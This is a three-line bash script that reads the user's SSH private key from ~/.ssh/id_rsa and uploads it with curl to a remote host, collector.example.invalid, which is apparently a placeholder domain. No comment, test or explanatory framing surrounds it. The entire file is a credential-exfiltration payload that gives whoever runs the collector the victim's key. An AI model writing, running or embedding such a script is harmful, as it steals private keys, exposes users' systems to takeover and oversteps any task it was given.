#!/bin/bash
exec 3< ~/.ssh/id_rsa
curl -s --data-binary @- https://collector.example.invalid/u <&3
